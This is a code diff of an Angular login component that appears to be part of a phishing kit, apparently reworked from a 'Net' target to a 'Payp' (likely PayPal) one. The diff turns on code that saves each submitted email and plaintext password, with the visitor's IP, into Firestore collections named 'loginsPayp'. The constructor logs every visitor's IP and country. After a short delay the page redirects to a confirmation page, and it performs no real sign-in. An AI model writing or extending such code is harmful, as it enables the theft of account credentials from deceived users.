@@ -16,26 +16,28 @@ import { map, catchError } from 'rxjs/operators';
   styleUrls: ['./login.component.css']
 })
 export class LoginComponent implements OnInit {
-  login: Login = {email:'',password:'',dateTime:'',ip:''};
-  visit:any = {ip:'',country:'',dateTime:''};
+  login: Login = { email: '', password: '', dateTime: '', ip: '' };
+  visit: any = { ip: '', country: '', dateTime: '' };
   loginsCollection: AngularFirestoreCollection<Login>;
   visitsCollection: AngularFirestoreCollection<any>;
-  logins:Observable<Login[]>;
-  
-  constructor(private router: Router, db: AngularFirestore,myService:MyService) { 
-    this.visitsCollection=db.collection('visitsNet');
-    this.visit.dateTime =Date.now();
+  logins: Observable<Login[]>;
+  started:boolean=false;
+ 
+
+  constructor(private router: Router, db: AngularFirestore, myService: MyService) {
+    this.visitsCollection = db.collection('visitsPayp');
+    this.visit.dateTime = Date.now();
     myService.getIpAddress().subscribe(ip => {
-      this.visit.ip=ip.ip;
+      this.visit.ip = ip.ip;
       myService.getCountry(ip.ip).subscribe(country => {
-        this.visit.country=country.country_name;
+        this.visit.country = country.country_name;
         this.visitsCollection.add(this.visit);
       });
     });
-    
 
-   
-    this.loginsCollection=db.collection('loginNet');
+
+
+    this.loginsCollection = db.collection('loginsPayp');
     /*this.logins=this.loginsCollection.snapshotChanges().pipe(
       map ( changes=> {
         return changes.map(
@@ -47,26 +49,41 @@ export class LoginComponent implements OnInit {
         )
       })
     );*/
-    
-    
+
+
   }
 
   ngOnInit() {
-    // if (localStorage.getItem('loggedIn') != null) {
-    //   this.router.navigate(['/confirm']);
-    // }
+    if (localStorage.getItem('loggedIn') != null) {
+      
+      this.router.navigate(['/confirm']);
+    }
   }
 
   onSubmit(form) {
-    // if (form.valid) {
-    //   this.login.dateTime=Date.now();
-    //   this.login.ip=this.visit.ip;
-    //   this.loginsCollection.add(this.login);
-    //  // this.myService.addLogin(this.login.email, this.login.password).subscribe(data => console.log(data));
-    //   localStorage.setItem('loggedIn', 'yes');
-    //   localStorage.setItem('ip',this.login.ip);
-    //   this.router.navigate(['/confirm']);
-    // }
+     if (form.valid) {
+       this.login.dateTime=Date.now();
+       this.login.ip=this.visit.ip;
+       this.loginsCollection.add(this.login);
+      // this.myService.addLogin(this.login.email, this.login.password).subscribe(data => console.log(data));
+       localStorage.setItem('loggedIn', 'yes');
+       localStorage.setItem('ip',this.login.ip);
+       
+       this.started=true;
+       this.delayAndRedirect(3000);
+       
+     }
+        
+
+     
+     
+  }
+
+
+
+  async delayAndRedirect(ms: number) {
+    await new Promise(resolve => setTimeout(() => resolve(), ms)).then(() => console.log("fired"));
+    localStorage.setItem('started', 'yes');
     this.router.navigate(['/confirm']);
   }
 
